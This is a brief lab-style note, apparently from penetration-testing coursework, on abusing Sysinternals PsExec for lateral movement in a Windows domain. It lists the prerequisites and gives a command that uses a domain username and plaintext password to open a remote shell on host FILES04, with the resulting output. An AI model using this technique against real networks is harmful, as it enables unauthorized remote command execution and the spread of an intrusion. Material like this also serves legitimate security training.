
It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the _ADMIN$_ share must be available, and third, File and Printer Sharing has to be turned on.

1. Download psexec binary on target system.


2.  Execute the binary with the target hostname specified domain&username and password.


```
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```